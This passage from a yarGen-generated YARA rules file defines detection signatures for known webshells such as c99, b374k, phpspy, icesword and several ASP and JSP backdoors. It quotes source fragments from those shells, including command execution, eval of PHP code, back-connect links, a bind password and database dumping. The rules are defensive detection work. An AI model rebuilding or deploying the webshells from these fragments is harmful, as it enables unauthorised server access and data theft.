      hash5 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash6 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash7 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash8 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash9 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash10 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash11 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $s1 = "<li><a href=\"new.htm\" onClick=\"return expandcontent('menu2', this)\" theme=\"#EAEAFF\"> <%=strCommand[languageNo]%> </a></li>" ascii
      $s2 = "if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith(\"multipart\")))" fullword ascii
      $s3 = "<li><a href=\"search.htm\" onClick=\"return expandcontent('menu4', this)\" theme=\"#EAEAFF\"> <%=strHelp[languageNo]%> </a></li>" ascii
      $s4 = "<li><a href=\"hot.htm\" onClick=\"return expandcontent('menu3', this)\" theme=\"#EAEAFF\"> <%=strSysProperty[languageNo]%> </a><" ascii
      $s5 = "if(sbCmd!=null && sbCmd.toString().trim().equals(\"\")==false)" fullword ascii
      $s6 = "<%@page import=\"java.io.*,java.util.*,java.net.*\" %>" fullword ascii
      $s7 = ".tabcontent{" fullword ascii
      $s8 = "#tabcontentcontainer{" fullword ascii
      $s9 = "StringBuffer sbCmd=new StringBuffer(\"\");" fullword ascii
      $s10 = "if(strAction!=null && strAction.equals(\"savecopy\"))" fullword ascii
      $s11 = "if(strAction!=null && strAction.equals(\"save\"))" fullword ascii
      $s12 = "if(strAction!=null && strAction.equals(\"down\"))" fullword ascii
      $s13 = "if(strAction!=null && strAction.equals(\"newFile\"))" fullword ascii
      $s14 = "if(strAction!=null && strAction.equals(\"edit\"))" fullword ascii
      $s15 = "if(strAction!=null && strAction.equals(\"del\"))" fullword ascii
      $s16 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TEXTAREA>" fullword ascii
      $s17 = "if(strAction!=null && strAction.equals(\"copy\"))" fullword ascii
      $s18 = "out.println(\"<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolord" ascii
      $s19 = "if(strCmd!=null) " fullword ascii
      $s20 = " &nbsp; <%=authorInfo[languageNo]%>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule _icesword_Jspspyweb_145 {
   meta:
      description = "webshell - from files icesword.jsp, Jspspyweb.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
      hash2 = "ae77377b007733bb984ccf751ba2ba26a5befc293a2266ca00d7e53125299947"
   strings:
      $s1 = "  end = dataHeader.indexOf(token, start) - 1;" fullword ascii
      $s2 = "  dataHeader = new String(inBytes, start, end - start + 1);" fullword ascii
      $s3 = "  start = dataHeader.indexOf(token) + token.length();" fullword ascii
      $s4 = "  byte[] inBytes = new byte[request.getContentLength()];" fullword ascii
      $s5 = "  filePath = dataHeader.substring(start, end + 1);" fullword ascii
      $s6 = "  end = inBytes.length - 1 - 2 - seperator.length - 2 - 2;" fullword ascii
      $s7 = "  //out.write(inBytes, start, end - start + 1);" fullword ascii
      $s8 = "  while ((nBytes = in.read(inBytes, start, size)) != -1) {" fullword ascii
      $s9 = "  while (! (inBytes[i] == 13 && inBytes[i + 2] == 13)) {" fullword ascii
      $s10 = "  sRet += \"</script>\\n\";" fullword ascii
      $s11 = "  sRet = \"<script language=\\\"javascript\\\">\\n\";" fullword ascii
      $s12 = "  in = request.getInputStream();" fullword ascii
      $s13 = "  String dataHeader = null;" fullword ascii
      $s14 = " if (str.getBytes().length <= len) {" fullword ascii
      $s15 = "  end = i - 1;" fullword ascii
      $s16 = "  File newFile = new File(path + fileName);" fullword ascii
      $s17 = "  String fileName = filePath.substring(filePath.lastIndexOf(\"/\") + 1);" fullword ascii
      $s18 = "  token = \"filename=\\\"\";" fullword ascii
      $s19 = "  token = \"\\\"\";" fullword ascii
      $s20 = "  String token = null;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x213c ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _2008_2009mssql_146 {
   meta:
      description = "webshell - from files 2008.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash2 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s2 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s3 = "p('<tr class=\"'.bg().'\"><td align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.for" ascii
      $s4 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s5 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s6 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s7 = "$mysqldata .= sqldumptable($currow[0]);" fullword ascii
      $s8 = "e as file <input class=\\\"input\\\" name=\\\"path\\\" value=\\\"\".SA_ROOT.$_SERVER['HTTP_HOST'].\"_MySQL.sql\\\" type=\\\"text" ascii
      $s9 = "sqldumptable($currow[0], $fp);" fullword ascii
      $s10 = "$filelist=$this -> GetFileList($dir);//" fullword ascii
      $s11 = "$content = @fread ($fd, filesize($filename));" fullword ascii
      $s12 = "<a href=\"javascript:goaction('eval');\">Eval PHP Code</a>" fullword ascii
      $s13 = "return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |" fullword ascii
      $s14 = "if ($kname != \"PRIMARY\" && $key['Non_unique'] == 0) {" fullword ascii
      $s15 = "<a href=\"javascript:goaction('phpenv');\">PHP Variable</a> | " fullword ascii
      $s16 = "header('Accept-Ranges: bytes');" fullword ascii
      $s17 = "header('Accept-Length: '.strlen($code));" fullword ascii
      $s18 = "return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s19 = "if (!$result) p('<h2>'.mysql_error().'</h2>');" fullword ascii
      $s20 = "$keys = q(\"SHOW KEYS FROM $table\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1___2012____1__r00tsFSO_147 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, _2012.asp, .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash6 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash7 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash8 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "decode = decode + Chr(pcstr)" fullword ascii
      $s2 = "name='FName' value='\"&Path&\"' style='width:100%'><br><textarea name='Content' style='width:100%;height:450'>\"&Txt&\"</textare" ascii
      $s3 = "T.WriteLine Request.form(\"content\")" fullword ascii
      $s4 = "for each obj in getObject(\"WinNT://.\")" fullword ascii
      $s5 = "If mode = \"pass\" Then number = 32: Cifnum = 144" fullword ascii
      $s6 = "If mode = \"user\" Then number = 30: Cifnum = 15" fullword ascii
      $s7 = "StreamLoadFromFile = .Read" fullword ascii
      $s8 = "pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)" fullword ascii
      $s9 = "Txt=HTMLEncode(T.readall) " fullword ascii
      $s10 = "HASH= Mid(data,3)" fullword ascii
      $s11 = "Set T=CF.CreateTextFile(Path)" fullword ascii
      $s12 = "if OBJ.StartType=\"\" then" fullword ascii
      $s13 = "CF.MoveFolder Path(0),Path(1)" fullword ascii
      $s14 = "CF.DeleteFolder Path" fullword ascii
      $s15 = "CF.CopyFile Path(0),Path(1)" fullword ascii
      $s16 = "CF.CopyFolder Path(0),Path(1)" fullword ascii
      $s17 = "if OBJ.StartType=4 then lx=\"" fullword ascii
      $s18 = ":\"&lx&\"]<font>&nbsp;\"&obj.path&\"</font></td></tr>\"" fullword ascii
      $s19 = "r><hr><input name='goback' type='button' value='Back' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='rese" ascii
      $s20 = "Set T=CF.opentextfile(Path, 1, False)" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_phpspy_2006_lnc_148 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, phpspy_2006.php, lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash3 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $s1 = " <a href=\\\"\".$path.\"\\\" target=\\\"_blank\\\">\".$path.\"</a>\";" fullword ascii
      $s2 = "$content = @fread ($fd, filesize ($filename));" fullword ascii
      $s3 = "<FORM action=\"\" method=\"POST\">" fullword ascii
      $s4 = "        $filelist=$this -> GetFileList($dir);//" fullword ascii
      $s5 = "    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |" fullword ascii
      $s6 = "    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);" fullword ascii
      $s7 = "foreach ($dl AS $filepath=>$value) {" fullword ascii
      $s8 = "pack('V', strlen($ctrldir)) ." fullword ascii
      $s9 = "$fd = fopen ($filename, \"r\");" fullword ascii
      $s10 = "$zdata   = gzcompress($data);" fullword ascii /* Goodware String - occured 1 times */
      $s11 = "$dfiles.=$filepath.\",\";" fullword ascii
      $s12 = "$ctrldir ." fullword ascii
      $s13 = "$dl=explode(\",\",$dfiles);" fullword ascii
      $s14 = "$dfiles=\"\";" fullword ascii
      $s15 = "    pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s16 = "        $this -> old_offset = $new_offset;" fullword ascii
      $s17 = "        pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s18 = "while (($file = readdir($dh)) !== false) {" fullword ascii /* Goodware String - occured 2 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99v2_c99shell_c99_149 {
   meta:
      description = "webshell - from files c99v2.php, c99shell.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = " else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = true;}}" fullword ascii
      $s2 = "  $body = \"c99shell v.\".$shver.\" feedback #\".$ticket.\"\\nName: \".htmlspecialchars($fdbk_name).\"\\nE-mail: \".htmlspecialc" ascii
      $s3 = "$log_email = \"user@host.tld\"; //Default e-mail for sending logs" fullword ascii
      $s4 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = true;}}" fullword ascii
      $s5 = "  // default password for binding" fullword ascii
      $s6 = "  elseif ($ft == \"ini\") {echo \"<pre>\"; var_dump(parse_ini_file($d.$f,true)); echo \"</pre>\";}" fullword ascii
      $s7 = "   if ($fqb_onlywithsh) {$true = (!in_array($sh,array(\"/bin/false\",\"/sbin/nologin\")));}" fullword ascii
      $s8 = "_email).\"\\nMessage:\\n\".htmlspecialchars($fdbk_body).\"\\n\\nIP: \".$REMOTE_ADDR;" fullword ascii
      $s9 = "$bindport_pass = \"c99\";" fullword ascii
      $s10 = "  bool {break} - if true and found match then break" fullword ascii
      $s11 = "  mail($suppmail,\"c99shell v.\".$shver.\" feedback #\".$ticket,$body,\"FROM: \".$suppmail);" fullword ascii
      $s12 = "$surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL." fullword ascii
      $s13 = "if (!function_exists(\"c99sh_getupdate\"))" fullword ascii
      $s14 = "  elseif (($result = `$cmd`) !== false) {}" fullword ascii
      $s15 = " while (($f = readdir($h)) !== false)" fullword ascii
      $s16 = " else {echo \"<b>File-System buffer</b><br><br>\"; $ls_arr = $arr; $disp_fullpath = true; $act = \"ls\";}" fullword ascii
      $s17 = " while (($o = readdir($h)) !== false)" fullword ascii
      $s18 = "  //Compiling table" fullword ascii
      $s19 = "$usefsbuff = true; //Buffer-function" fullword ascii
      $s20 = "Next code isn't for editing" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_5_source_b374k_2_2_b374k_2_6_source_b374k_2_7_source_150 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.5.source.php, b374k-2.2.php, b374k-2.6.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash4 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash5 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2" ascii
      $s2 = "av5jDgDh0sbA0aROgJyEGJnMhwlh6xyb8Cq7ALogD6a3mV1ybxSD44/kMq1BWp/WluaRQhgQKFC8RE8K6cc8+C9lSHifYhme9NkmcgfuYuoEYCTG+EYUI4oV8Ie0hGJm" ascii
      $s3 = "c8SH/za/Bw9nVa3pyG4IeUp9qnPRJj3lrQx4bAMQGWg/tqdgigPDWOBheq3gnH8AWjTCoQBvcE68m9g5W1BMiSZ4taFu64aw+BGBINqgZTKpBY/R4aIO9qsCRFu2cigD" ascii
      $s4 = "YJyRCJIPbskoq25eSUj4See38sCvgCLSC8nx7W5BmkN0I2c1DUp7FqUlwZK6uK5VgNO+YxfVH54Yd50N7lwbk32wPdokuo5xbrP/ldT9nuL90IblFRwzUN4FwCfWBBrE" ascii
      $s5 = "wSRTc5dnowBe+Hj6uVEWpbtBLrSY+XNh8L3DOF3hP/Up9ZQRe6a5o+VCMaH0Tg70ycBJ95/JZzzTTuc2FhnDgkQPvX+yNOtIahR7mJalD//nlXHqxxjCNX1ll/m07Ym1" ascii
      $s6 = "/7KB+8V3PVk/vz8XR4cu9xkhj3qqbdrB9Ecn1eZdk9G3Po2uvVnZ21lU20Kyc0FkYi6mkqRHHOxkvDXA1szPslb4YibIezoGlVspvbuuNS8kNrbRJepJypOYeVh2rNOr" ascii
      $s7 = "gqfVC9FyqLup86/xeOGgNgsdlJrC2xUqcd2vj2DweELsyMTaCk8CVQByxP48hkXAkRMdKcv5mL1MjVObU8ClnZxektjuAuHyOi8hByhY6iTnwIDzFE7KcWdbruGJIyuC" ascii
      $s8 = "yZejKOVHBEU6zycZxY+s93I8V63/LM+oF1shKOUcsqCVx6HjHc6VtFFQAc+Njz7DHvIx9lxrullTx2pl2Qx9ReNYcLei5YHFwNG/anKE+W9d1f7wsrHecFaTLRs1eMG3" ascii
      $s9 = "e+r619lm/Vfbae/+x9zphG9UACgAAtJZhGAAqga9EBf57kmnZwLraALiud9+mEhF63yZqK1cCisTCBDGDD7IYAoEQApkcUCwVgFwBGBAeCfKFbI4zgaBvO5ODHggAoQg" ascii
      $s10 = "ZxJwLGLeGT7UvvshvkzfFNKJph6ENvkd1zX0PTX2pei19o7nhq4O9AgX6WhrdX19jqUagIUkkVEq+NSTAqBLL2iv7Yc3pKygz1wm3zv5tRF8cZmlqzZoD2QLQVO3Xv5n" ascii
      $s11 = "GZ8ZmQ0uyppwkeXW5ivSecjjavAqdjxhRklBG8qbPa4sSanTufLygH7pQ3P1sIuxB+36HjHp5KhYRvrO8qoQVYeKGtyPKK+B9llfWaTys5R9BKBWNhVLrKgajHR7qkrp" ascii
      $s12 = "SX3i9WCvdz1/K1srWw8dvVmoHUL1XNu2zlRc37cPeLDrYg3ePhkwKS1+IkDchkpHhUMN7SRqlk9axDICtzy88CEREhkW2f4HhSCCCwxdCHDCSI07ksjgSMIwhYCTgZV6" ascii
      $s13 = "tkYakgPYMNlvsaN4BD4ILmCgJdydHGG/PdHAIQi5OnFq8h+Xk6YxwcznCMoIrYKILSyiI5ya4cD28F+NSEvhcQYKTZCsD5g8I+WwnNgNiiFxjFoBz/YVSHlvYCY8L7CD" ascii
      $s14 = "5cwM6xQZNo4zZ7fsla+BexemqM6U0xfN5SYok68D6qw78OtnCOf9ql0dNZa+J/+7Bq8tgwgCd0lSF889Meno98EILCtfib6q0CF9drmvvGozlVROXvtINLbTqvLEuJke" ascii
      $s15 = "LVsSMRUknFc8U6Z8UD6UEZfTW7nKS0kCJH/BraF0V0jOW8g/Yhnf5x+V2iZSu1IuDj8pvOKCTbBf20ozieLS6J25Ug1bErdCYuxBpMdYgyKXNo4M0QN27O+iQ5sgJrF9" ascii
      $s16 = "130dyMUHYBqhL8ev64NGStfDRrVpQ645RoORNaM0b+GiyFlCW8LRSm20Ehmum/wHQo7ahI9fDT1W7T2u3SwZmyuLsM6PpUfRpMJqhCrCVbQN8bks/ygdk/ZgsGAb+n/6" ascii
      $s17 = "QHBJzOYkcUMA4BYrAIP/U1AfV/lHgYhBECflz5eOl9d2OTsuOg76+hbGxXEBZgI91iA1kCyuivewlfDxr69zdw6vZgsmdgJNlaMhy/4lBGN4QFBayOsgpMNgpKiDMzSl" ascii
      $s18 = "crj6Gtewj8amT8iZ5OlZHiv/RwvyF/nUhBZ5vyjwJY1zZapou6G2hlWaOnuRAXTO2PcWWr2l6y7bOz48O/Qa3+FUFrpleoF/g1v4DjvKd24cdtr8SzwQfK5djhEKD8WZ" ascii
      $s19 = "2XEHfyPwtOlmWe9C50zMsr7ikkr2qkZt3dns76lXfyJdOz/tlWI4paO/OGY5iLFqIssHNj4wDfMsCX5DjtN1Y3ElS9BFUSxyKrlOOBE4gzzjqHYfvwmWyNQgam02DhHy" ascii
      $s20 = "V4Yh1aV7n0nmAkNjvH4ZQtnra2WDEDHMc7u41azE2p1OqL+7/og4zHTeFNENqYH/Zz5avjYkBSoIjkNMGuV0GqFbNV1JtI+C50QSqn6Fjre9zn7ez9ezcb7Y1VY4/fDn" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _yijuhua_jsp_151 {
   meta:
      description = "webshell - from files yijuhua.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f4a0353cab22847ddfe6a2f875cb941e5e4dd78c3eadc33d0bc9f2a38bccf606"
      hash2 = "6b4e479af8f1890e3d56bdf85186f380ba971d4ddc2ca261d076597f290e1456"
   strings:
      $s1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
      $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
      $s3 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
      $s4 = "bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")!=-1?p.trim():p+q.substring(q.in" ascii
      $s5 = "sb.append(r.getObject(i)+\"\" + \"\\t|\\t\");" fullword ascii
      $s6 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
      $s7 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
      $s8 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
      $s9 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
      $s10 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
      $s11 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
      $s12 = "String Z = EC(request.getParameter(Pwd) + \"\");" fullword ascii
      $s13 = "String s = request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
      $s14 = "while ((n = is.read(b)) != -1) {" fullword ascii
      $s15 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[" ascii
      $s16 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[" ascii
      $s17 = "Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/nu" ascii
      $s18 = "Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/nu" ascii
      $s19 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();" fullword ascii
      $s20 = "bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")!=-1?p.trim():p+q.substring(q.in" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _ELMALISEKER_Backd00r_ntdaddy_152 {
   meta:
      description = "webshell - from files ELMALISEKER Backd00r.asp, ntdaddy.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "53346253fef1d655c844c914a6535fed1d82b98b45ceb27ff39e37a54f55a49a"
      hash2 = "baf4c45b84a1cca5fd1b32df4d4d60d7cb41135c61156772bd9eec6f7660af6e"
   strings:
      $s1 = "'Commands" fullword ascii
      $s2 = "tempmsg=\"ASCII\"" fullword ascii
      $s3 = "TempAtt=int(Request.form(\"FolderAttribute1\"))" fullword ascii
      $s4 = "f.attributes=int(TempAtt)" fullword ascii
      $s5 = "TempAtt=int(Request.form(\"FileAttribute1\"))" fullword ascii
      $s6 = "tempmsg=\"Unicode\"" fullword ascii
      $s7 = "Cmd=Request.Form(\"cmdOption\")" fullword ascii
      $s8 = "response.write(\"</table>\")" fullword ascii
      $s9 = "response.write(\"</td></tr>\")" fullword ascii
      $s10 = "objMail.Subject=anonSubj" fullword ascii
      $s11 = "TextFile.Close" fullword ascii
      $s12 = "response.write(\"</tr></table>\")" fullword ascii
      $s13 = "objMail.Body=anonBody" fullword ascii
      $s14 = "response.write(\"<tr>\")" fullword ascii
      $s15 = "TextCmd=Request.form(\"cmdtxtFileOption\")" fullword ascii
      $s16 = "TextFile.close" fullword ascii
      $s17 = "response.write(\"</tr>\")" fullword ascii
      $s18 = "TextStream.Close" fullword ascii
      $s19 = "response.write(\"</form>\")" fullword ascii
      $s20 = "response.write(chr(13))" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x213c ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_3_2_3_min_b374k_3_2_2_min_153 {
   meta:
      description = "webshell - from files b374k-3.2.3.min.php, b374k-3.2.2.min.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bc3b1b3d51e1202e00b06426a65942adb3628658de5f3808026bd2970b651152"
      hash2 = "0497d0a609565a8737af2eebe28e7909e91c9e693b911f8abe206b8975657b9a"
   strings:
      $s1 = "ybLr8JMs36/6BeKFpV6dO9jzsqgqxyqu+B8umcKvISLcBvbo//MrK051QdfrK0Ts9pjYPfvLSQ4V+R5hGYxOkHWd3AT0WVGU7TOM0XeP7t9auLEpXT5J0KAPx/fPPPY6" ascii
      $s2 = "HQetfmy3tpF4smNttdQesM+VSxHDq0k+fKurgSRoPKPl2Or5g1PUhL0rbT6YkrVqDb07KoaiVGXi7Po5YChHhmER8I9eR83JW3w7YkSfW0Imgsp81S45VYGmn9Xad9jO" ascii
      $s3 = "NgQ6WYGB9Xwhkhuxjqg1U3WMtGleZ+LtWSoAGNA6ufJ/tePDXjwrPwaJNPlJJMiusfhaSUDik7tjotC+lMk9fP1UpxNzmOpoVYLbjVM3I33qltte662OYOnF6ZFYeL9D" ascii
      $s4 = "utRlMS++FVWhMy4jgVb4kskynV0+3Evgsaw5+Y1KIT30xih/Rw2B4fugNuU5tGh9HFalybHmaD0S4ny1k6vKpnJ1W61mzyc27WWBW5VSbBily3nojIcq62mFa4ZJw+Np" ascii
      $s5 = "sfrDTkIS838+tpTtLGQ/3MZIdSOtGux+hSsdFrDSaasKqMgxFuk+6NhUMjmw5G69NjNbWYnSeD+oZLdugDIyaruXIvk42ValpnHdfrHKepsWkkkSxGhW03HM0sEnMgS/" ascii
      $s6 = "LaOW+C7dNMDp7Tm0a6Uo9NWiuGSeVPmSgzmo5jY200U/rnWX5UlJWmMNxJoYnQLp0HY2mk6On+KlsSZ9pxlItprfFm38gO+0f2tBo3lxwdOVXi69ooN4916Wypox6HsX" ascii
      $s7 = "1yVEgVtJLSzo+O/UNvpg1K2iFZpiPbkjgaHvsxfZQZr2ub1eY4yzbpSiObCoZbtRR7ytDzjbhdKUovI2en1Vozs4y1K4NCMB08dPXNtJnnK/1j99gsnsf7zUavd85Lbb" ascii
      $s8 = "iy7fHnVTKVzEUzfe20icxmzOzQqB8EUUvwS0ZqKxEoEPr9bj3T2IcB60uVTHStLovzdSs8z7DteLxdj8/iYpWJjo7y8TjjlHM7OG6cmRrY06YP03KiV98WWlzsEGwXup" ascii
      $s9 = "eT4VYrERvQmrw8NMJ0qFySTqW4sOTB9jPaSuVap0aiWAQraDzaYGc6LUf7GbAr57LheLcwp4tdvbcMT3vCPFQMb7QTw8ebzUhFGO33265wDtPb5oTTNGG/Paem8TndCI" ascii
      $s10 = "8torHyqDat6s1KSOGEflgchM7d1Sy1qWw3wiFXSJ/3dHacDS3XITFdr2ZD/CRY2KXX7fXisE+LkTavh4CcW2iJybR/6qUOs4zG8o0OzRdT6vEwne0L59g5XAZKWqajRz" ascii
      $s11 = "CYC7OlKhdi54weO/Zao+ZALybyh4VUPhcGy0pE64TS5dxOXJ/S7E5ahpq5c0hOxEJ8hwvuK+yhk+k0JomtUGaDEbqzaO/rsViFC4U4OVQIxSflfH2g9Oe5rNAfLYOTQS" ascii
      $s12 = "pbvtDYnXrLczaljRQ52to3Ynn2lFQiXL8fG4rRCDfbLsbRHVDQmEx/MF2Xw8X0+TSfxYTjVC03liK/TpYGy0JQLkYWlXPvlMtUJ0q1JAyCyVp6ku21evx+my02Tq1xMh" ascii
      $s13 = "YRu0uw5nJKvlDa749ci9di0eMxttodmlNxuDn098y+N27q1cU5WJrPE3kuH15qeyU0jfD9YrbXnZWzTbl2ys0y41aop4ipbEEejltq8RAcpAbVucjVGpy4Wrbyw128yF" ascii
